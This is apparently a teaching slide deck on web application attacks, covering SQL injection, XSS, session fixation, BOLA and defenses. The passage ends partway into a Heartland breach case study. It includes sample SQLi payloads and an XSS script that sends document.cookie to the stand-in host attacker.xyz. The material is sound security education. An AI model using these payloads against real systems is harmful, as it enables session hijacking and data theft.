---
deck:
  title: Web Application Attacks
  kicker: Class 22
  accent: "#B3001B"
  background: "#FFFFFF"
  logo: logo.png
  background_image: bg.png
  class_number: 22
  description: Technical mechanics of SQL injection, Cross-Site Scripting (XSS), insecure authentication, and API vulnerabilities.
  topics: [SQL Injection, Cross-Site Scripting, Insecure Authentication, API Security, BOLA]
---

%%%
---
title: Web Application Attacks
cover: true
---
:::text class=sub
The OWASP Top 10 in Action: Technical Mechanics, Exploit Vectors, and Core Attack Scenarios
:::
:::list style=chips
- Injection Mechanics (SQLi)
- Browser-Side Exploits (XSS)
- Session & Auth Failures
- API Security (BOLA)
:::

:::image src="images/22_cover_web_app_attacks.png" alt="Title card graphic for Web Application Attacks. A 2x2 grid of attack-type icons on a white background with dark red accents. Top-left cell: a syringe injecting SQL text into a database cylinder (SQL Injection, CWE-89). Top-right cell: a JavaScript angle-bracket pair overlaid with a spider-web motif (XSS, CWE-79). Bottom-left cell: a broken padlock beside a user silhouette (Authentication Failures, OWASP A07). Bottom-right cell: an API endpoint URL bar with a broken chain link (BOLA, API Security Top 10 #1). The OWASP shield logo watermark appears in the upper-right corner. Clean technical diagram, labeled, professional textbook style." caption="Web Application Attacks: four critical OWASP attack classes examined through their technical mechanics, exploit chains, and mitigations." width=full
:::

%%%
---
unit: Injection
code: SQL
title: SQL Injection (SQLi) Mechanics
---
:::callout style=soft
**SQL Injection (SQLi)** (classified as **CWE-89**) occurs when untrusted user input is directly concatenated into a database query string, allowing an attacker to manipulate the SQL parser and execute arbitrary database commands.
:::

::::columns ratio=1:1
::col::
:::code language=sql caption="Vulnerable Query Construction, user input is concatenated directly into the SQL string"
-- The developer concatenates input directly into the query.
-- The database cannot distinguish attacker data from SQL syntax.
SELECT * FROM users 
WHERE username = '$INPUT_USER'   -- Input injected here with no escaping
AND password = '$INPUT_PASSWORD'; -- Attacker can comment out this clause
:::
::::card heading="The Malicious Input payload"
- **Input username**: `admin' --`
- **Resulting query logic**:
  ```sql
  SELECT * FROM users 
  WHERE username = 'admin' --' AND password = '...';
  ```
- **Outcome**: The comment indicator (`--`) truncates the password check, granting admin access.
::::
::col::
:::code language=sql caption="Mitigated (Parameterized) Query, query structure is compiled before user data is supplied"
-- The database receives the query template first
-- and compiles it into an execution plan independently.
SELECT * FROM users 
WHERE username = ?   -- Placeholder: the DB treats whatever fills here as DATA only
AND password = ?;    -- Never parsed as SQL syntax, injection is structurally impossible
:::
:::list heading="Types of SQLi" style=plain
- **In-band (Classic)**: Data returned in same channel (Union-based, Error-based).
- **Inferential (Blind)**: No data returned; inferred via boolean checks or time delays.
- **Out-of-band**: Data exfiltrated via external protocols (DNS/HTTP).
:::
::::

:::image src="images/22_sqli_attack_flow.png" alt="Two-panel technical diagram. Left panel: 'Vulnerable Path' showing user input flowing into a string concatenation operation that produces a malformed SQL statement. The SQL parser then executes attacker-controlled commands against the database. A red arrow shows unauthorized data being returned. Right panel: 'Secure Path' showing user input flowing into parameterized query processing where input is treated as a literal value parameter, not SQL syntax. A green checkmark indicates the injection attempt is neutralized." caption="SQL Injection mechanism: without parameterization, the database parser cannot distinguish attacker-supplied SQL syntax from application-authored query structure." width=full
:::

:::flow
Developer concatenates user input into SQL string
Database receives combined string as a single SQL command
SQL parser tokenizes the entire string (cannot distinguish intent from data)
Attacker-supplied quote character closes the string literal
Attacker appends SQL comment (--) to nullify the remaining WHERE clause
Database executes attacker-controlled query with application-level privileges
Unauthorized data is returned or database is modified
:::

:::notes
SQL Injection, cataloged as CWE-89 and one of the most persistent security vulnerabilities in recorded software history, traces the exact moment when the data-instruction boundary collapses. The root cause is architecturally simple: when a developer constructs a SQL query by concatenating strings, including user-supplied input, the database's SQL parser has no way to distinguish which portions of the string were intended as SQL commands by the developer and which portions were intended as literal data provided by the user. Everything is treated as instructions.

To understand the mechanics at a deeper level, consider how the SQL parser tokenizes the query. When the database engine receives the string `SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`, it reads character by character. The first single quote opens a string literal. The characters `admin` become the literal value. The second single quote, supplied by the attacker as part of the input, closes that string literal prematurely. The double dash `--` is recognized as the SQL standard comment delimiter, instructing the parser to ignore every subsequent character on that line. The entire `AND password = '...'` clause disappears. The database faithfully executes the resulting query, finds the administrator account, and returns it to the application, which interprets the non-empty result set as a successful authentication.

Beyond authentication bypass, SQL injection has historically been weaponized to perform mass data exfiltration. The 2008 Heartland Payment Systems breach, which exposed approximately 130 million credit card numbers, was accomplished via SQL injection. The 2014 Sony Pictures breach and the 2017 Equifax data exposure both involved SQL injection as a component of the attack chain. In Union-based In-Band SQLi, the attacker appends a `UNION SELECT` clause that joins the output of the original query with attacker-specified columns from other tables, for example, `UNION SELECT username, password FROM admin_users`. In Blind SQLi scenarios, where the application suppresses database errors and does not display query results directly, attackers use Boolean-based inference (observing whether the page loads differently based on true/false conditions) or time-based inference (using `SLEEP()` or `WAITFOR DELAY` commands to deduce information from server response timing). Out-of-band SQLi leverages database features like DNS lookups (`xp_dirtree` in SQL Server, `load_file` in MySQL) to exfiltrate data to external servers the attacker controls, even when the web application's response channel is completely suppressed.

The parameterized query solution works because it separates the compilation step from the execution step. First, the application sends the query template with placeholder markers to the database engine. The database compiles this template into an optimized execution plan and stores it. The structural layout of the query, which parts are commands, which are table names, which are column names, is now fixed and immutable. Second, the application sends the user-supplied data as separate parameters to be bound into the pre-compiled execution plan. At this stage, the data is treated exclusively as literal values, never parsed again as SQL syntax. A single quote in the input is treated as a quote character within a string, not as a SQL string delimiter. This separation is absolute and structural. It is not a filter or an escape function that can be bypassed with clever encoding; it is a fundamental architectural guarantee enforced by the database driver itself.

The OWASP Web Security Testing Guide (WSTG-INPV-05) provides comprehensive testing procedures for SQLi detection, including the use of automated scanners like sqlmap and manual black-box testing techniques such as fuzzing with SQL metacharacters (`'`, `"`, `;`, `--`, `/**/`). Every production web application that interacts with a database should be tested against these vectors before deployment.
:::

%%%
---
unit: Browser Exploits
code: XSS
title: Cross-Site Scripting (XSS) Taxonomy
---
:::callout style=soft
**Cross-Site Scripting (XSS)** (classified as **CWE-79**) involves the injection of malicious client-side script (typically JavaScript) into a trusted website, which is subsequently executed within the security context of a victim's web browser.
:::

::::columns ratio=1:1
::col::
::::card heading="Stored (Persistent) XSS"
:::list style=tight
- **Mechanism**: The malicious payload is saved in the application's database (e.g., in a forum post, comment, or user profile).
- **Execution**: Every user who visits the affected page retrieves the payload and executes it.
- **Impact**: High; can silently compromise thousands of sessions.
:::
::::
::::card heading="Reflected (Non-Persistent) XSS"
:::list style=tight
- **Mechanism**: The payload is embedded in a request (often a URL query parameter) and reflected back immediately in the response.
- **Execution**: Requires the victim to click a specially crafted link.
- **Impact**: Targeted; commonly used in phishing campaigns.
:::
::::
::col::
::::card heading="DOM-Based XSS"
:::list style=tight
- **Mechanism**: The vulnerability exists entirely in the client-side JavaScript code.
- **Execution**: The script reads input from a source (e.g., `window.location.hash`) and writes it to an unsafe sink (e.g., `document.write` or `element.innerHTML`) without validation.
- **Impact**: The server is never aware of the payload; execution occurs purely in the browser document object model (DOM).
:::
::::
:::code language=html caption="Classic XSS Session Theft Payload, script reads the browser cookie and exfiltrates it to an attacker-controlled server"
<script>
  // document.cookie returns all cookies for this domain,
  // including the session token if HttpOnly flag is NOT set.
  // The fetch() API sends an HTTP GET request to the attacker's
  // logging server with the cookie value appended as a URL parameter.
  // This entire script executes silently in the victim's browser
  // with the same permissions as legitimate page scripts.
  fetch('https://attacker.xyz/log?cookie=' + document.cookie);
</script>
:::
::::

:::image src="images/22_xss_attack_types_comparison.png" alt="Three-column diagram comparing Stored XSS, Reflected XSS, and DOM-based XSS side by side. Each column shows an attack flow with labeled boxes and arrows: Stored XSS shows attacker posting payload to database, victim browser retrieving it, and script executing. Reflected XSS shows attacker crafting a malicious link, victim clicking it, server reflecting the script in HTML response, and browser executing it. DOM XSS shows a malicious URL fragment being read by JavaScript on the client side and written to an unsafe sink without any server involvement." caption="The three XSS variants: Stored, Reflected, and DOM-based. Each has a distinct attack chain and server visibility profile." width=full
:::

:::flow
Attacker identifies an input field whose content is rendered as HTML for other users
Attacker crafts a script payload (e.g., <script>fetch('https://attacker.xyz/?c='+document.cookie)</script>)
Payload is submitted to server: stored in database (Stored XSS) or embedded in crafted URL (Reflected XSS)
Victim's browser requests the affected page or clicks the attacker's phishing link
Server returns HTML response with the unencoded script payload embedded in the DOM
Browser HTML parser encounters the script tag and passes it to the JavaScript engine for execution
Script runs within the page's origin; Same-Origin Policy grants it full access to cookies, DOM, and local storage
Attacker's logging server receives the stolen session token; attacker imports cookie and hijacks the victim's session
Apply context-aware output encoding and enforce a strict Content Security Policy (CSP) to break the chain at steps 5 and 7
:::

:::notes
Cross-Site Scripting, tracked as CWE-79, represents a conceptual inversion of the trust model that browsers use. The browser's Same-Origin Policy (SOP) is one of the most fundamental security boundaries on the web. It restricts JavaScript running on one origin (the combination of scheme, hostname, and port) from accessing data on a different origin. For example, a script on `https://attacker.xyz` cannot read cookies from `https://bank.com`. However, XSS breaks this protection from the inside. By injecting malicious JavaScript into the legitimate `https://bank.com` domain itself, the attacker's code runs with the same origin privileges as any other script on the page, rendering the Same-Origin Policy irrelevant. From the browser's perspective, the malicious script is indistinguishable from a legitimate analytics script or UI framework loaded by the real application.

The three XSS types differ primarily in how the payload reaches the victim's browser. Stored XSS, also called persistent XSS, is the most severe because it weaponizes the application's own database as the delivery mechanism. An attacker posts a script payload to any user-generated content field, a comment, a product review, a user profile bio, a forum post. The server stores this payload in the database without sanitization. Every subsequent user who loads the affected page triggers the retrieval of the stored payload from the database and its injection into the HTML response, causing their browsers to execute the attacker's script. A single successful stored XSS attack can compromise the sessions of thousands of users simultaneously, all without any further interaction from the attacker. The 2005 Samy Worm on MySpace, which infected one million accounts in under twenty-four hours, was a classic stored XSS exploit.

Reflected XSS relies on a delivery mechanism external to the application: a crafted link. The attacker embeds a script in a URL query parameter, for example, `https://vulnerable-site.com/search?q=<script>...</script>`, and tricks a victim into clicking it through phishing, social engineering, or a malicious advertisement redirect. When the victim's browser sends the request, the server incorporates the unsanitized query parameter directly into the HTML response, and the browser executes the script. Because reflected XSS requires user interaction, it scales less effectively than stored XSS, but it is highly effective in targeted attacks against specific users, such as account takeover attempts targeting company executives.

DOM-based XSS is architecturally distinct in that the server is never involved in the payload delivery. The vulnerability lives entirely within client-side JavaScript code. The attack proceeds when a script on the legitimate page reads data from a user-controllable source, such as `window.location.href`, `document.referrer`, or `window.location.hash`, and writes that data to an unsafe execution sink without sanitization. Dangerous sinks include `innerHTML`, `document.write()`, `eval()`, `setTimeout()` with a string argument, and jQuery's `$()` selector when passed user input. Because the payload never touches the server, server-side input filters and Web Application Firewalls (WAFs) cannot detect or block DOM XSS; it must be addressed exclusively through secure client-side coding practices.

The primary defenses against XSS are context-aware output encoding and Content Security Policy (CSP). Output encoding translates HTML metacharacters into their entity equivalents at render time, `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, preventing the browser from parsing them as HTML or JavaScript. Critically, output encoding must match the injection context: encoding rules for HTML body content differ from those for HTML attributes, JavaScript strings, CSS values, and URL parameters. A library like OWASP Java Encoder or DOMPurify provides context-specific encoding. Content Security Policy adds a second layer by instructing the browser to refuse to execute inline scripts or scripts loaded from unauthorized domains, limiting the damage of any XSS that slips through input validation and output encoding.
:::

%%%
---
unit: Authentication
code: AUT
title: Insecure Authentication and Session Vulnerabilities
---
:::callout style=soft
**Identification and Authentication Failures** (OWASP **A07**) and session management flaws allow adversaries to compromise user credentials, hijack active sessions, or assume identities without authorization.
:::

::::columns ratio=1:1
::col::
::::card heading="Common Authentication Flaws"
:::list style=tight
- **Credential Stuffing**: Automated injection of compromised username/password pairs harvested from previous breaches.
- **Missing Multi-Factor Authentication (MFA)**: Relying solely on single-factor authentication (passwords).
- **Verbose Error Messages**: Revealing if a username exists (e.g., "Invalid password for user admin" vs. "Invalid login credentials").
:::
::::
::col::
::::card heading="Session Hijacking Vectors"
:::list style=tight
- **Predictable Session Tokens**: Generation of session IDs using weak random number generators (insufficient entropy).
- **Session Fixation**: Forcing a user to authenticate using a pre-determined session ID set by the attacker.
- **Lack of Cookie Flags**: Missing `HttpOnly` (allows XSS cookie access) or `Secure` (allows plaintext transmission over HTTP).
:::
::::
::::

:::image src="images/22_session_hijacking_attack_flow.png" alt="Four-panel sequential diagram showing a session fixation and hijacking attack. Panel 1: Attacker obtains a pre-authentication session token from the server. Panel 2: Attacker embeds this session ID in a crafted link and sends it to the victim via phishing. Panel 3: Victim clicks the link, logs into the application, and the server elevates the same session ID to an authenticated state. Panel 4: Attacker uses the now-authenticated session ID to access the victim's account. Cookie attribute annotations (HttpOnly, Secure, SameSite) highlight defensive measures." caption="Session fixation attack chain: the server's failure to regenerate the session ID upon login allows the attacker to pre-set and later hijack the victim's authenticated session." width=full
:::

:::flow
Attacker obtains a valid pre-authentication session token
Attacker embeds this token in a phishing link sent to the victim
Victim clicks the link; browser sends requests with the attacker's session ID
Victim completes login; application elevates the existing session ID to authenticated
Application fails to issue a new session token after authentication
Attacker's pre-known token is now a valid authenticated session
Attacker accesses application as the victim without knowing their password
:::

:::notes
Authentication and session management represent the identity gateway to a web application. If these controls fail, every downstream security control, authorization, audit logging, data encryption, may be rendered worthless, because the application will operate on the false belief that the attacker is a legitimate, authorized user. OWASP A07 encompasses a broad range of flaws that share this common outcome: granting access to an unauthorized party.

Credential stuffing is one of the most prolific and cost-effective attacks in modern cybercrime. Following a data breach at any one online service, the stolen credential pairs (usernames and passwords) are sold on dark web marketplaces and compiled into massive datasets known as "combo lists." Credential stuffing tools, such as Snipr, OpenBullet, and SentryMBA, automate the process of testing millions of these pairs against target login portals, exploiting the widespread human behavior of reusing passwords across multiple accounts. According to Google's research, approximately 0.5 to 2 percent of leaked credentials successfully authenticate against at least one other online service. When scaled to breaches involving hundreds of millions of records, even a low success rate yields enormous numbers of compromised accounts. The 2020 Zoom breach, where approximately 500,000 credentials were found for sale online, was not the result of Zoom being hacked; it was the result of credential stuffing using credentials from other breaches.

The defense against credential stuffing requires a layered approach. Multi-Factor Authentication (MFA) renders compromised passwords insufficient by themselves, requiring a second factor, a time-based one-time password (TOTP) from an authenticator app, a hardware security key, or a biometric confirmation, that the attacker typically cannot replicate. Rate limiting and CAPTCHA controls limit the number of login attempts from a single IP address, slowing automated stuffing attacks below the threshold of profitability. Account lockout policies provide a similar defense but must be carefully tuned to avoid creating a Denial of Service vector where an attacker deliberately locks out every account by submitting known-invalid credentials.

Session management flaws operate at a different stage: after authentication has been completed. Once the server verifies a user's identity, it issues a session token, a random string stored in a cookie, that the browser presents with every subsequent request. This token is the digital equivalent of a wristband at a venue: it proves you passed the check at the door without requiring you to re-authenticate on every page. If this token has insufficient entropy, an attacker can guess it through brute force. If it lacks the `HttpOnly` cookie attribute, a Cross-Site Scripting payload on any page within the application can read `document.cookie` and steal the token. If it lacks the `Secure` attribute, the browser will transmit it over unencrypted HTTP connections, exposing it to network eavesdropping. If the application fails to regenerate the session token upon authentication, session fixation becomes possible: an attacker pre-sets a session token, tricks the victim into using it to log in, and then uses that same token (now elevated to an authenticated state) to access the victim's account without knowing their password. Secure session management requires tokens of at least 128 bits of cryptographic randomness, token regeneration upon every authentication event, short idle timeouts, and proper cookie security attributes.
:::

%%%
---
unit: API Security
code: API
title: "API Vulnerabilities: BOLA and Data Exposure"
---
:::callout style=soft
Modern web architectures rely heavily on APIs (Application Programming Interfaces). These interfaces introduce specific vulnerabilities, summarized in the **OWASP API Security Top 10**.
:::

::::columns ratio=1:1
::col::
::::card heading="Broken Object Level Authorization (BOLA)"
:::list style=tight
- **Also Known As**: Insecure Direct Object Reference (IDOR).
- **Mechanism**: The application exposes a direct key or database identifier in the API request (e.g., `/api/v1/user/1004/profile`).
- **Exploitation**: The attacker changes the identifier to `1005` to access another user's record.
- **Root Cause**: The server verifies that the user is logged in, but fails to verify if the user owns the requested object.
:::
::::
::col::
::::card heading="Excessive Data Exposure"
:::list style=tight
- **Mechanism**: The API endpoint returns a complete database record JSON, relying on the client-side user interface to filter and hide sensitive fields.
- **Exploitation**: The attacker accesses the API directly (via browser developer tools or Postman) to read the hidden sensitive fields (e.g., SSN, roles, home address).
:::
::::
:::code language=json caption="Vulnerable API Response, the endpoint returns fields that should never leave the database server"
{
  "id": 1004,          // User's numeric database primary key, directly exposed in the URL
  "username": "alice", // Legitimate display field
  "email": "alice@company.com", // Legitimate display field
  "password_hash": "$2b$12$...", // CRITICAL ERROR: hash should NEVER be returned to client
  "isAdmin": false     // CRITICAL ERROR: role field enables privilege escalation if modified
}
:::
::::

:::image src="images/22_bola_api_exploit_diagram.png" alt="Diagram showing a BOLA/IDOR attack sequence. Step 1: Authenticated user Alice sends a GET request to /api/v1/user/1004/profile and receives her own data. Step 2: The attacker (also logged in as a different user) modifies the URL to /api/v1/user/1005/profile. Step 3: The server checks authentication token (valid) but skips ownership validation. Step 4: The server returns Bob's private profile data to the attacker. A red annotation highlights the missing authorization check between steps 2 and 3." caption="BOLA (Broken Object Level Authorization): the API validates that the requester is authenticated but fails to verify that they own the requested object." width=full
:::

:::flow
Attacker authenticates to the application with a valid but low-privileged account
Attacker opens browser developer tools and captures the API calls made by the frontend
Attacker identifies a predictable object identifier pattern in the URL (e.g., /api/v1/user/1004/profile)
Attacker modifies the identifier value (1004 → 1005) and replays the request with their valid authentication token
API server validates the authentication token and confirms the user is logged in
Server skips object-level ownership check; response returns HTTP 200 with the target user's full JSON record
Attacker iterates through sequential or predicted identifiers to enumerate and exfiltrate all records at scale
Apply per-request ownership check on the server: verify that the authenticated user's ID matches the requested object's owner ID before returning any data
:::

:::notes
As web applications have transitioned from server-rendered HTML pages delivered by a single application server to decoupled architectures where lightweight frontends communicate with dedicated API backends, the nature of web application vulnerabilities has shifted accordingly. APIs, particularly REST and GraphQL endpoints, are now the primary interface between clients and business logic, and they carry their own distinct vulnerability patterns that the original OWASP Top 10 was not designed to fully address. In 2019, OWASP published a dedicated API Security Top 10 list to address this gap, with BOLA (Broken Object Level Authorization) at the number one position.

BOLA is categorized as API Security Risk #1 because it is simultaneously one of the most prevalent and most impactful API vulnerabilities, and because it is fundamentally difficult to detect using automated scanning tools. Unlike SQL injection, which leaves distinctive syntax markers in payloads, a BOLA exploit looks like a completely normal API request, a valid authentication token, a properly formatted URL, a standard HTTP method. The only difference is the value of one numeric or UUID identifier. The server's failure is invisible to packet inspection: it returns an HTTP 200 response with a JSON body, the same response it would return for a legitimate request. Only by examining the business logic, who owns record 1005?—can the flaw be detected.

The root cause of BOLA is an authorization architecture error: authentication and authorization are treated as identical. Many API implementations verify that the requester possesses a valid session token (authentication) but do not subsequently verify that the token holder has the right to access the specific object they are requesting (object-level authorization). This pattern appears with remarkable frequency in applications built by developers who learned API design without a security-first background. The fix requires implementing an explicit ownership check, or in more complex scenarios, an access control list (ACL) check, on every API endpoint that retrieves, modifies, or deletes a specific object: "Does the authenticated user own (or have explicit permission to access) this specific object?"

The Excessive Data Exposure vulnerability reveals a dangerous assumption in API design: that the client is the gatekeeper for sensitive data. When an API backend returns a complete database record, including fields like `password_hash`, `isAdmin`, internal audit timestamps, or government ID numbers, and relies on the frontend React or Angular application to simply not display those fields to the user, it creates an enormous security gap. Any user with browser developer tools, any API testing tool like Postman or Insomnia, or any HTTP interception proxy like Burp Suite can call the API endpoint directly, bypassing the frontend UI entirely, and read the full JSON response. The 2019 Facebook data exposure that revealed sensitive user information for hundreds of millions of accounts involved APIs that returned far more data than the frontend displayed. The correct architectural principle is that APIs should return only the fields that are appropriate for the requesting client's role and context, not the complete database record. This is sometimes called the principle of "response minimization" or "data minimization at the API layer."
:::

%%%
---
unit: Attack Flow
code: FOW
title: "Scenario: Multi-Stage Web Application Attack"
---
:::steps
1. **Reconnaissance**: Attacker probes API endpoints and maps parameter patterns.
2. **BOLA Exploitation**: Attacker modifies a numeric ID in the URL to scrape valid usernames.
3. **Credential Spraying**: Attacker runs automated logins using the scraped usernames and common passwords.
4. **XSS Injection**: Attacker injects a malicious script payload into a profile comment field.
5. **Session Hijacking**: An administrator views the profile; the script steals their session token.
6. **Privilege Escalation**: Attacker uses the stolen admin session to assume full control.
:::

:::image src="images/22_multistage_attack_chain.png" alt="Horizontal kill-chain diagram with six labeled stages connected by arrows: (1) Reconnaissance, magnifying glass icon over API documentation; (2) BOLA Exploit, URL bar with incrementing ID numbers; (3) Credential Spraying, automated tool icon with username list and password dictionary; (4) XSS Injection, comment field with script tag payload; (5) Session Hijacking, cookie icon being stolen by an arrow pointing to the attacker; (6) Privilege Escalation, admin badge icon. Each stage shows the vulnerability type and OWASP category exploited. The overall diagram uses a red attack-path arrow flowing left to right." caption="Multi-stage web application attack chain: individual vulnerabilities are chained together to escalate from reconnaissance to full administrative compromise." width=full
:::

:::notes
To fully appreciate the danger of web application vulnerabilities, we must understand that attackers rarely rely on a single flaw in isolation. Real-world attacks, particularly those that achieve significant impact, are typically multi-stage operations in which each vulnerability serves as a stepping stone to the next. A single SQLi flaw or a single XSS payload may have limited immediate impact; chained together with reconnaissance, credential attacks, and privilege escalation, they produce total system compromise.

The attack chain presented here represents a realistic scenario drawn from patterns documented in breach investigations and penetration testing reports. In the reconnaissance phase, the attacker behaves like any normal user, browsing the application and recording its structure. They open their browser's developer tools, navigate to the Network tab, and watch the API calls made by the frontend. They notice that profile requests follow a pattern like `/api/v1/user/1004/profile`. This is the beginning of the BOLA discovery. They write a small script that iterates through ID numbers, sending authenticated requests and saving any 200 responses. Within minutes, they have scraped a list of all valid usernames and email addresses in the database.

With a username list in hand, the attacker transitions to credential spraying. Unlike brute force, which targets one account with many passwords, spraying tests one or two common passwords against all accounts, staying below rate-limiting and account lockout thresholds. If even a fraction of users have weak passwords, this attack yields compromised accounts. After gaining access to a low-privileged account, the attacker explores the application for stored XSS vectors. They find a comment or bio field that is displayed to other users, including administrators. They craft a payload that, when executed, reads the victim's session cookie and exfiltrates it via a fetch request to an external logging server.

The attacker then waits. When an administrator reviews the page or moderates the comment, their browser silently executes the script. Their session cookie arrives at the attacker's logging server. The attacker imports this cookie into their browser, navigates to the application, and the server accepts them as the authenticated administrator. The administrative console is now under the attacker's control. This complete attack chain used four distinct OWASP categories: BOLA (API1), authentication weaknesses (A07), stored XSS (A03), and privilege escalation (A01). No single defense would have stopped all stages; only a layered security posture, covering input validation, output encoding, proper authorization checks, MFA, and session security, provides comprehensive protection.
:::

%%%
---
unit: Injection
code: SQLT
title: SQLi Types Deep Dive, In-Band, Blind, and Out-of-Band
---
:::callout style=soft
The three SQLi categories differ not in the injection mechanism but in **how the attacker receives information** from the vulnerable database, the exfiltration channel determines which technique is applicable.
:::

:::table
| Type | Data Channel | Technique | Example Function |
|---|---|---|---|
| In-Band (Union) | HTTP response body | UNION SELECT to append attacker columns | `UNION SELECT table_name,2 FROM information_schema.tables--` |
| In-Band (Error) | HTTP error message | Force DB error that leaks data | `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))` |
| Blind Boolean | Page content difference | TRUE vs FALSE query logic | `AND 1=1` (loads) vs `AND 1=2` (fails) |
| Blind Time | HTTP response delay | Conditional SLEEP command | `AND IF(1=1,SLEEP(5),0)` |
| Out-of-Band | DNS / HTTP lookup | DB sends data to attacker server | `LOAD_FILE('\\\\attacker.xyz\\x')` |
:::

:::code language=mermaid caption="SQLi exfiltration channels, the attack technique is chosen based on what information is visible in the HTTP response."
flowchart TB
  I["<b>In-band</b><br/>Results or database errors appear directly in the page"]
  B["<b>Blind</b><br/>No data shown; true and false conditions change the page or its response time"]
  O["<b>Out-of-band</b><br/>Data leaves through a separate channel such as DNS"]
  I ~~~ B ~~~ O
  D["One root defense for all three: parameterized queries"]
  O --- D
:::

:::notes
Understanding the three SQLi categories is essential for both offensive testers who need to know which technique to apply and defensive engineers who must configure appropriate countermeasures. The injection vector, unsanitized user input concatenated into a SQL string, is identical in all three cases. What varies is the attacker's visibility into the database's response.

In-Band SQLi is the most direct and easiest to exploit. In the Union-based variant, the attacker appends a UNION SELECT clause whose number of columns matches the original query. The database executes both SELECT statements and returns the combined result set to the application, which renders it in the HTTP response. The attacker can read table names from `information_schema.tables`, column names from `information_schema.columns`, and then retrieve arbitrary data from any table they discover. In the Error-based variant, the attacker deliberately causes the database to generate an error message that contains data. Functions like MySQL's `EXTRACTVALUE()` and `UPDATEXML()` can be manipulated to embed query results inside the error text, which many applications display to the user in development mode or improperly configured production environments.

Blind SQLi is required when the application suppresses both query results and error messages, a common configuration in production environments with proper error handling. Boolean-based blind SQLi sends a condition-containing query and observes whether the application's response changes. For example, `WHERE id=1 AND SUBSTRING(password,1,1)='a'` either returns the normal page (character is 'a') or an empty/error page (character is not 'a'). By iterating through each character position and each possible character value, the attacker can eventually reconstruct any string in the database, one character at a time. This is slow, reconstructing a single 32-character MD5 hash might require thousands of requests, but fully automated tools like sqlmap handle the iteration automatically.

Time-based blind SQLi uses conditional delay functions (`SLEEP()` in MySQL, `pg_sleep()` in PostgreSQL, `WAITFOR DELAY` in SQL Server) to exfiltrate data when no page content difference is observable at all. If the response takes five seconds, the condition was true; if it responds immediately, false. Out-of-Band SQLi uses database features that initiate outbound network connections, DNS lookups triggered by `LOAD_FILE()`, `xp_dirtree`, or `UTL_HTTP.request()` in Oracle, to send data to an attacker-controlled server even when the web application response channel is entirely suppressed. NIST SP 800-53 control SI-10 (Information Input Validation) directly addresses prevention of all these injection variants through parameterization and stored procedures.

Automated SQL injection tools such as sqlmap, run against a deliberately vulnerable application, enumerate databases, tables and full contents (the --dbs, --tables and --dump operations) in under a minute, which shows the level of automation an attacker can bring to an unparameterized query.
:::

%%%
---
unit: Injection
code: SQLD
title: SQL Injection Defense, Parameterization and Beyond
---
:::callout style=soft
Parameterized queries are the primary defense against SQLi. A layered approach adds **stored procedures**, **input validation**, **least privilege**, and **WAF filtering** to create defense in depth.
:::

::::columns ratio=1:1
::col::
:::steps
1. **Parameterized Queries / Prepared Statements**: Compile SQL template before user data is bound. Structurally prevents injection.
2. **Stored Procedures**: Encapsulate SQL logic on the database server; the application calls a named procedure, not raw SQL.
3. **Input Validation (Allowlist)**: Reject input that does not conform to expected format (e.g., numeric IDs must match `^\d+$`).
4. **Least Privilege**: Application DB account should only have SELECT/INSERT on tables it needs, no DROP, no xp_cmdshell.
5. **Error Suppression**: Never return database error messages to users in production.
6. **WAF Rules**: Deploy OWASP Core Rule Set (CRS) in front of the application to block known SQLi patterns.
:::
::col::
:::code language=python caption="Python, correct use of parameterized query with psycopg2 (PostgreSQL)"
import psycopg2

conn = psycopg2.connect(DATABASE_URL)
cursor = conn.cursor()

# CORRECT: query template and data are separated
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password_hash = %s",
    (username, password_hash)   # tuple of parameters, never interpolated into the SQL string
)
user = cursor.fetchone()

# WRONG: never do this
# cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
:::
::::

:::image src="images/22_sqli_defense_layers.png" alt="Concentric circle diagram showing SQL injection defense layers from innermost to outermost. Innermost layer: Parameterized Queries labeled as the architectural root defense. Second layer: Stored Procedures. Third layer: Input Validation (allowlist). Fourth layer: Least Privilege DB Account. Fifth layer: Error Suppression. Outermost layer: WAF/CRS. Each layer is labeled with a brief description. A red arrow representing an SQLi attack is shown being stopped at different layers depending on the attack variant, illustrating defense in depth." caption="SQL injection defense in depth: parameterized queries are the foundational control; additional layers reduce residual risk and limit breach impact." width=full
:::

:::notes
The security community's guidance on SQL injection prevention is unusually unambiguous: parameterized queries (also called prepared statements) are not merely the recommended approach, they are the definitive architectural solution. Every major language and framework provides a parameterized query API: psycopg2 and SQLAlchemy in Python, JDBC PreparedStatement in Java, PDO in PHP, SqlCommand with parameters in .NET, and pg or mysql2 in Node.js. The mechanism is the same in all cases: the SQL query template is sent to the database engine first, which compiles it into an execution plan. When the application later supplies user-supplied parameter values, they are bound into the pre-compiled plan as typed data values, strings, integers, dates, never as SQL syntax. No amount of SQL metacharacter abuse by the attacker can alter the query structure at this stage.

Stored procedures offer similar structural protections when implemented correctly. A stored procedure encapsulates SQL logic inside the database server itself; the application calls the procedure by name and passes parameters. As long as the stored procedure itself uses parameterized query syntax internally (rather than constructing dynamic SQL with EXEC or sp_executesql from string concatenation), the protections are equivalent to application-level parameterization. However, stored procedures implemented with dynamic SQL construction inside the procedure body introduce the same injection risk as application-level string concatenation, the layer of indirection does not eliminate the underlying flaw.

Allowlist input validation adds a secondary verification layer. For user inputs that should conform to a narrow expected format, numeric identifiers, date strings, country codes, enumerated values, the application should validate the format before passing the value to the database layer at all. A user ID that contains anything other than digits is immediately rejected at the application layer, never reaching the database. This is not a replacement for parameterization (a validation bypass could still occur) but a complementary defense that also reduces the attack surface for other injection types.

Least-privilege database accounts address the blast radius when an injection does succeed. If the application's database connection account has only SELECT privilege on specific tables and no ability to call extended stored procedures like `xp_cmdshell`, a successful SQLi attacker cannot escalate to operating system command execution. NIST SP 800-53 AC-6 (Least Privilege) and the CIS Controls (Control 4: Controlled Use of Administrative Privileges) both mandate the principle of minimum necessary privileges for service accounts. The OWASP Database Security Cheat Sheet provides specific recommended permission sets for read-only, read-write, and administrative application accounts.

Tool-free testing is fundamental: the OWASP Testing Guide section WSTG-INPV-05 describes manual input-validation test cases against a login form that require no tools, and that manual understanding should precede reliance on automation.
:::

%%%
---
unit: Injection
code: CASE1
title: "Case Study: Heartland Payment Systems Breach (2008)"
---
:::callout style=soft
**The largest credit card breach in history at the time of its disclosure.** Approximately **130 million** credit and debit card numbers were stolen from Heartland Payment Systems through SQL injection attacks on their corporate web applications.
:::

::::columns ratio=2:1
::col::
:::list heading="Attack Timeline and Mechanics" style=plain
